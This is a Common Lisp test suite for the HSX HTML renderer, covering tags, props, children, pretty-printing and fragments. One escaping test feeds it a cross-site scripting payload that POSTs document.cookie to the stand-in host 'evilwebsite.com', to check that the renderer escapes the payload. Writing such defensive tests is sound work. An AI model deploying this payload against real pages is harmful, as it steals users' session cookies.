(defpackage #:hsx-test/renderer
  (:use #:cl
        #:fiveam
        #:named-readtables
        #:hsx/builtin)
  (:import-from #:mstrings)
  (:import-from #:hsx/element
                #:render-to-string))
(in-package :hsx-test/renderer)
(in-readtable mstrings:mstring-syntax)

(def-suite renderer-test)
(in-suite renderer-test)

(test empty-tag
  (is (string= "<div></div>"
               (render-to-string (div)))))

(test tag-with-props
  (is (string= "<div prop1=\"value1\" prop2></div>"
               (render-to-string
                (div :prop1 "value1" :prop2 t :prop3 nil)))))

(test tag-with-children
  (is (string= "<p>foo</p>"
               (render-to-string (p "foo") :pretty t)))
  (is (string= #M"<p>
                 \  <span>foo</span>
                 \</p>"
               (render-to-string
                (p
                  (span "foo"))
                :pretty t)))
  (is (string= #M"<p>
                 \  foo
                 \  <span>bar</span>
                 \</p>"
               (render-to-string
                (p
                  "foo"
                  (span "bar"))
                :pretty t))))

(test tag-with-props-and-children
  (is (string=  "<p prop1=\"value1\" prop2>foo</p>"
                (render-to-string
                 (p :prop1 "value1" :prop2 t :prop3 nil
                   "foo")
                 :pretty t)))
  (is (string= #M"<p prop1=\"value1\" prop2>
                 \  foo
                 \  <span>bar</span>
                 \</p>"
               (render-to-string 
                (p :prop1 "value1" :prop2 t :prop3 nil
                  "foo"
                  (span "bar"))
                :pretty t))))

(test self-closing-tag
  (is (string= "<img src=\"/background.png\">"
               (render-to-string
                (img :src "/background.png")
                :pretty t))))

(test escaping-tag
  (is (string= "<div>&lt;script&gt;fetch(&#x27;evilwebsite.com&#x27;, { method: &#x27;POST&#x27;, body: document.cookie })&lt;&#x2F;script&gt;</div>"
               (render-to-string
                (div "<script>fetch('evilwebsite.com', { method: 'POST', body: document.cookie })</script>")))))

(test non-escaping-tag
  (is (string= "<script>alert('<< Do not embed user-generated contents here! >>')</script>"
               (render-to-string
                (script "alert('<< Do not embed user-generated contents here! >>')")))))

(test fragment
  (let ((frg (<>
               (li "bar")
               (li "baz"))))
    (is (string= #M"<li>bar</li>
                    <li>baz</li>"
                 (render-to-string frg :pretty t)))
    (is (string= #M"<ul>
                   \  <li>foo</li>
                   \  <li>bar</li>
                   \  <li>baz</li>
                   \  <li>brah</li>
                   \</ul>"
                 (render-to-string
                  (ul
                    (li "foo")
                    frg
                    (li "brah"))
                  :pretty t)))))
